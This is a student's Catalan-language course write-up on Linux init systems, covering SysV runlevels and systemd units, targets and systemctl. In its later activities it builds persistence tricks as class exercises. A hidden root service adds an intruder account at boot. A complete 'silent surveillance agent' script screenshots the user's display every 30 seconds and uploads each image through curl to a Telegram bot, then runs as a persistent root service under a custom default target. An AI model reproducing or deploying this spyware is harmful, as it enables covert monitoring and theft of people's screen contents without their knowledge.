---
layout: default
title: "SISTEMES D'INICI"
---
# SISTEMES D'INICI

## Índex

**1- SystemV vs Upstart vs Systemd**
* 1.1- Runlevels o Targets?
* 1.2- Quin el nostre SO?
  

**2- SystemV**
* 2.1- Directoris
* 2.2- Procés arrencada

**3- Systemd**
* 3.1- Directoris
* 3.2- systemctl
* 3.3- dependències
* 3.4- Modificar target provisional
* 3.5- Modificar target definitiu
* 3.6- Afegir/treure serveis target
* 3.7- Creem nou servei
* 3.8- Creem nou target personalitzat
---

o
<img width="1024" height="572" alt="image" src="https://github.com/user-attachments/assets/d6d2a5fa-8d2d-4d93-aa4a-6054b6f91b4d" />

---

## Conceptes

* **Kernel** -> gestiona processos
* **Aplicació** -> programa interactua usuari i executa 1r pla
* **Servei** -> programa associat SO i 2n pla
* **Procés** -> f(x) intern del SO
  * *Nota:* Aplicacions i serveis -> generen processos (sincronitzar i planificar)

---

## Nivells d'execució

* **0** - power off
* **1** - rescue -> 1 usuari (dimonis mínims)
* **2-5** -> multiusuari, xarxa, sense...
* **6** -> reboot

---

## Comandes d'aturada

* `/etc/init.d/cron stop`
* `service cron stop`
* `systemctl stop cron`


---


**1- SystemV vs Upstart vs Systemd**
* 1.1- Runlevels o Targets?

ACTIVITAT 1
Com sabem a quin nivell d'execució estem actualment?
Amb la comanda `runlevel` (exemple en Ubuntu 24.04):
<img width="304" height="54" alt="image" src="https://github.com/user-attachments/assets/a2c038e5-88ab-4345-a83a-43ba62589b87" />

* 1.2- Quin és el nostre SO?

Mitjançant la comanda `man init` o veient cap a on apunta l'enllaç simbòlic de `/sbin/init`:

<img width="894" height="761" alt="image" src="https://github.com/user-attachments/assets/0b0e154c-0560-45de-a417-c0688c578443" />
readlink -v /sbin/init
<img width="500" height="39" alt="image" src="https://github.com/user-attachments/assets/59574d16-7e13-4c72-bc25-96d6ad7b7ff3" />


**2- SystemV**

* 2.1- Directoris

El directori `/etc/init.d/`
Aquí hi trobem tots els scripts d'engegada del sistema (els dimonis), com ara `cron`.
Tot el que està gestionat mitjançant l'estàndard SystemV s'allotja a `init.d`. 

<img width="840" height="167" alt="image" src="https://github.com/user-attachments/assets/c18e78eb-5baf-4d0e-a5f6-dff36100561a" />




Dintre de `/etc/` també hi trobem les carpetes de `rcX.d` (runlevels):
<img width="413" height="291" alt="image" src="https://github.com/user-attachments/assets/9485aa78-e523-4106-b38a-acbf6f8ab45f" />

<img width="825" height="127" alt="image" src="https://github.com/user-attachments/assets/4514cd8c-89c7-4a11-9958-03116e35c6f7" />

* 2.2- Procés arrencada

Comanda `init`
Accionem la comanda `init` juntament amb el nivell d'execució desitjat per canviar l'estat del servidor, per ex: `init 6` fa un reboot.


**3- Systemd**

* 3.1- Directoris

El directori per defecte on s'instal·la la configuració base de `systemd` és:
`/lib/systemd/system`
<img width="770" height="446" alt="image" src="https://github.com/user-attachments/assets/b491b996-7fc5-4ea8-b89b-0d73cea8f23e" />


Directori `/etc/systemd`
Aquest l'utilitzarem sempre que vulguem modificar alguna configuració. En cas de duplicitat sempre preval la configuració editada d'`/etc/` per sobre de `/lib/`.

* 3.2- systemctl

Per filtrar per tipus d'unitats:
Per exemple, si llistem i filtrem els tipus `target` que gestiona `systemd`:
<img width="715" height="682" alt="image" src="https://github.com/user-attachments/assets/137b0395-2386-44d8-a95c-7cecff975b01" />

Per veure l'estat en el qual arrenca el sistema per defecte `systemctl get-default`:
<img width="555" height="42" alt="image" src="https://github.com/user-attachments/assets/9c5c69f9-f22b-42d2-87b8-b713841e9c68" />

COMANDA systemd-analyze (mesura el temps pres al primer arrencament)
<img width="762" height="61" alt="image" src="https://github.com/user-attachments/assets/bd12ead6-4174-4b2b-b719-647e93d06dfd" />

* 3.3- dependències

Aquesta comanda, `systemctl list-dependencies`, ens diu concretament el `graphical.target` quines dependències té requerides en actiu perquè s'aixequi:
<img width="897" height="190" alt="image" src="https://github.com/user-attachments/assets/0ba425c5-644a-43ee-b89b-3fa2761eecbf" />

<img width="870" height="860" alt="image" src="https://github.com/user-attachments/assets/67db002f-93df-4eb7-98b5-80c1492d80f7" />

* 3.4- Modificar target provisional

L'`isolate` és altament semblant al de `init`:
<img width="649" height="26" alt="image" src="https://github.com/user-attachments/assets/1478d00b-6ef0-48dd-92f7-3f8a86645b26" />

Per canviar d'estat del sistema temporalment a mode manteniment utilitzarem:
`systemctl isolate rescue.target`
<img width="642" height="20" alt="image" src="https://github.com/user-attachments/assets/d7c86410-12e9-4e3a-a3e0-13224246bfb5" />

* 3.5- Modificar target definitiu

Si busquem un target per nom, per exemple l'enllaç original de `default.target`, normalment apunta directament a `graphical.target` (l'escriptori per defecte):
<img width="838" height="288" alt="image" src="https://github.com/user-attachments/assets/a5780c8a-d073-44cd-b33d-91cc1f03f456" />

Si borrem l'enllaç manualment (o fem `systemctl set-default`) i el tornem a crear apuntant-lo de forma directa cap a qualsevol target que requereixi el sistema per procediment...
<img width="688" height="37" alt="image" src="https://github.com/user-attachments/assets/12ad743a-cc84-4cf3-a49f-02554b309248" />

A la imatge següent l'entorn per defecte ja no serà el gràfic, sinó que serà un de manteniment: `target.rescue`.

<img width="684" height="248" alt="image" src="https://github.com/user-attachments/assets/e1936118-af48-4e38-bb6b-defb192c4337" />

Podem comprovar-ho en fer _reboot_, ens quedarem dins una prompt en `rescue mode` a l'espera de resoldre'l o cancel·lar la reparació (revertim els canvis després per reparar-ho):
<img width="733" height="162" alt="image" src="https://github.com/user-attachments/assets/5c437560-7682-4232-82a6-ee3565c2803e" />

* 3.6- Afegir/treure serveis target

ACTIVITAT 2 SSH

El primer que cal verificar i en cas necessari instal·lar és el programari del servei ssh.
<img width="857" height="911" alt="image" src="https://github.com/user-attachments/assets/fe2e9e62-6cb0-4220-908d-8e8b92148a8a" />

El darrer pas rellevant és afegir o habilitar manualment el lligam de dependències gràcies a `--now` en actiu com a unitat.
<img width="859" height="359" alt="image" src="https://github.com/user-attachments/assets/e32bc40d-2c8e-4633-bd1d-d4e9c46aded3" />

* 3.7- Creem nou servei

ACTIVITAT 3:
Crear un servei propi amb l'extensió `.service`.

Com ja hem exemplificat el ficarem a dependre d'un determinat `target` actiu. D'aquesta forma, quan s'engegui automàticament farà contacte inicial i ho obrirà en espai ocult des dels procediments d'engegada del *root*. Aquesta potència faria que es pogués explotar per complet una vulnerabilitat al propi dispositiu amb una simple reengegada.

Demostració:

Posem fil a l'agulla i creem l'script funcional ocultat.
<img width="609" height="185" alt="image" src="https://github.com/user-attachments/assets/6d3738c5-98a4-4176-9335-ff9998e8507f" />

Atorguem obligatòriament els permisos especials d'execució:
<img width="411" height="45" alt="image" src="https://github.com/user-attachments/assets/4ac5f6b7-2e7d-4d9e-9637-38f765fc04ac" />

Finalment dissenyem i creem el document cridador `.service`.
<img width="646" height="329" alt="image" src="https://github.com/user-attachments/assets/5b317894-32c0-49f7-93e5-ad929c4d958d" />

Habilitem com a servei oficial permanent aquesta nova capsa negra:
<img width="897" height="636" alt="image" src="https://github.com/user-attachments/assets/85ad35d5-1b23-46d6-9d10-cb2ce080a148" />

A simple vista com podem detectar-ho de base? Si fem un _reboot_, l'acció en l'script programat anteriorment ens generarà una entrada anòmala a part del normal; on un usuari `a` o intrús s'observarà als usuaris propis actius d'`/etc/passwd`!

<img width="735" height="602" alt="image" src="https://github.com/user-attachments/assets/4b9793a5-72fb-4c20-96b8-dfc0b3a644c7" />

---

* 3.8- Creem nou target personalitzat

ACTIVITAT 4: Agent Silenciós de Vigilància amb Captura de Pantalla i Bot de Telegram

**Objectiu:** Crear un `target` propi que s'activi a l'arrencada del sistema gràfic i que executi un servei amb permisos de `root`. El servei capturarà automàticament la pantalla de l'usuari cada 30 segons amb `scrot` i enviarà les captures al nostre canal privat de Telegram mitjançant la seva API. Demostrarem així com un servei injectat en el cicle de boot pot actuar com un agent de monitoratge complet i silenciós.

**(Nota general: Tots els passos es realitzen com a `root`. Fer `sudo su` per entrar a la sessió root abans de continuar.)**

---

**PAS 1: Instal·lar les dependències necessàries**

Necessitem `scrot` (per fer captures de pantalla) i `curl` (per enviar les imatges a Telegram). En un entorn gràfic, `scrot` necessita accés al display X11.

```bash
apt update
apt install -y scrot curl
```

> **(📸 Captura: Resultat de l'`apt install` mostrant que `scrot` i `curl` han estat instal·lats correctament o ja estan presents.)**

---

**PAS 2: Configurar el Bot de Telegram**

Abans de crear l'script, necessitem el `TOKEN` del nostre bot i el `CHAT_ID` del destinatari:

1. Crea un bot nou parlant amb `@BotFather` a Telegram i guarda el **token** (`123456:ABC-DEF...`).
2. Envia un missatge al bot, després obre al navegador: `https://api.telegram.org/bot<TOKEN>/getUpdates` i copia el `chat.id`.

Apunta els dos valors, els necesssitarem al pas 3.

> **(📸 Captura: Navegador mostrant el JSON de `getUpdates` amb el `chat_id` visible, o el missatge de `@BotFather` amb el token del bot.)**

---

**PAS 3: Crear l'script espies `pauserra_spy.sh`**

Creem l'script que farà les captures i les enviarà a Telegram. **Substitueix `TON_TOKEN` i `TON_CHAT_ID` pels valors del pas anterior.**

```bash
nano /usr/local/bin/pauserra_spy.sh
```

Contigut de l'script:
```bash
#!/bin/bash
# pauserra_spy.sh — Agent de vigilància silenciós
# Executa captures de pantalla cada 30s i les envia per Telegram

TOKEN="TON_TOKEN_AQUI"
CHAT_ID="TON_CHAT_ID_AQUI"
SCREENSHOT_DIR="/var/log/pauserra_spy"
DISPLAY_ENV=":0"

mkdir -p "$SCREENSHOT_DIR"

while true; do
    TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
    SCREENSHOT="$SCREENSHOT_DIR/screen_$TIMESTAMP.png"

    # Capturem la pantalla de l'usuari gràfic (display :0)
    DISPLAY=$DISPLAY_ENV scrot "$SCREENSHOT" 2>/dev/null

    if [ -f "$SCREENSHOT" ]; then
        # Enviem la captura al bot de Telegram
        curl -s -X POST "https://api.telegram.org/bot${TOKEN}/sendPhoto" \
            -F chat_id="$CHAT_ID" \
            -F photo=@"$SCREENSHOT" \
            -F caption="🕵️ Captura: $TIMESTAMP" \
            > /dev/null 2>&1

        # Esborrem la captura local per estalviar espai (opcional)
        rm -f "$SCREENSHOT"
    fi

    sleep 30
done
```

Donem permisos d'execució:
```bash
chmod +x /usr/local/bin/pauserra_spy.sh
```

> **(📸 Captura: Resultat de `ls -la /usr/local/bin/pauserra_spy.sh` mostrant els permisos `rwxr-xr-x` i que el propietari és `root`.)**

---

**PAS 4: Executar l'script manualment per verificar que funciona**

Abans de delegar l'execució al sistema, comprovem que l'script funciona correctament executant-lo nosaltres mateixos des del terminal. Aquesta prova manual ens garanteix que la lògica és correcta i que el bot de Telegram respon.

Obre un terminal com a `root` i executa l'script directament:
```bash
/usr/local/bin/pauserra_spy.sh &
```

Espera uns 10-15 segons (el temps que tarda `scrot` a capturar i `curl` a enviar) i comprova el Telegram: hauries de rebre una captura de pantalla amb el caption `🕵️ Captura: YYYYMMDD_HHMMSS`.

Per aturar el procés de prova un cop verificat:
```bash
kill %1
```

Alternativament, si vols veure el que fa en temps real (sense enviar a Telegram), pots fer una captura puntual manualment:
```bash
DISPLAY=:0 scrot /tmp/prova_manual.png && ls -lh /tmp/prova_manual.png
```

> **(📸 Captura 1: El terminal mostrant el procés corrent en segon pla (`[1] PID`) just després d'executar l'script amb `&`.)**

> **(📸 Captura 2: El mòbil o client de Telegram rebent la captura de pantalla en temps real, confirmant que l'script funciona correctament de forma manual.)**

---

**PAS 5: Crear el target `pauserra.target`**

Creem el nostre target personalitzat que dependrà de `graphical.target` (s'iniciarà quan l'escriptori estigui llest). El nomenclaturem amb el nostre nom per identificar-lo clarament:

```bash
nano /etc/systemd/system/pauserra.target
```

Contingut:
```ini
[Unit]
Description=Target personalitzat Pau Serra — Agent de vigilància
Requires=graphical.target
After=graphical.target
AllowIsolate=yes
```

> **(📸 Captura: El fitxer `pauserra.target` obert amb `nano` mostrant el contingut sencer, especialment la línia `Requires=graphical.target`.)**

---

**PAS 6: Crear el servei `pauserra-spy.service`**

Creem el `.service` que executarà l'script com a `root` i el vincularà al nostre target:

```bash
nano /etc/systemd/system/pauserra-spy.service
```

Contingut:
```ini
[Unit]
Description=Agent de vigilància silenciós — Pau Serra
After=graphical.target

[Service]
Type=simple
User=root
Environment=DISPLAY=:0
ExecStart=/usr/local/bin/pauserra_spy.sh
Restart=on-failure
RestartSec=10

[Install]
WantedBy=pauserra.target
```

> **(📸 Captura: El fitxer `pauserra-spy.service` obert amb `nano` mostrant el contingut complet, especialment les línies `User=root` i `WantedBy=pauserra.target`.)**

---

**PAS 7: Activar i configurar com a target per defecte**

Executem les comandes en ordre per registrar els nous fitxers, habilitar el servei i fer que el nostre target sigui el que carregui per defecte:

```bash
systemctl daemon-reload
systemctl enable pauserra-spy.service
systemctl set-default pauserra.target
```

> **(📸 Captura: El terminal mostrant en seqüència els outputs de les tres comandes, especialment la creació del symlink confirmat per `set-default`.)**

---

**PAS 8: Reinici i verificació final**

Reinicia la màquina virtual:
```bash
reboot
```

Un cop el sistema hagi arrencat, obre un terminal i comprova que el servei est en execució:
```bash
systemctl status pauserra-spy.service
```

Hauries de veure `active (running)`. A més, al teu Telegram hauries d'aparèixer en breu (en un màxim de 30 segons) la primera captura de pantalla del sistema.

Verifica també quin target és ara el per defecte:
```bash
systemctl get-default
```
Ha de mostrar `pauserra.target`.

> **(📸 Captura 1: `systemctl status pauserra-spy.service` mostrant `active (running)` i el PID del procés.)**

> **(📸 Captura 2: `systemctl get-default` mostrant `pauserra.target` com a target actiu per defecte.)**

> **(📸 Captura 3: El telèfon o client de Telegram rebent les captures de pantalla del sistema de forma automàtica (sense intervenció manual), amb el caption i la marca de temps visible.)**

---

## Resum de compliment de l'enunciat

| Requisit de la professora | Com es compleix en aquesta activitat |
|---|---|
| 1. Crear target propi, fer-lo default i comprovar accés | `pauserra.target` creat al PAS 5, `set-default` al PAS 7, verificat amb `get-default` + `systemctl status` al PAS 8 |
| 2. Crear servei dintre del target i comprovar que s'inicia al reiniciar | `pauserra-spy.service` amb `WantedBy=pauserra.target` al PAS 6, verificat amb `systemctl status active (running)` al PAS 8 |
| 3. Modificar el servei per executar script amb permisos root | `User=root` al `.service` (PAS 6) + `chmod +x` a l'script (PAS 3) |
| 4. Programar script i executar-lo manualment per veure si funciona | Script `pauserra_spy.sh` creat al PAS 3, executat manualment i verificat al **PAS 4** |
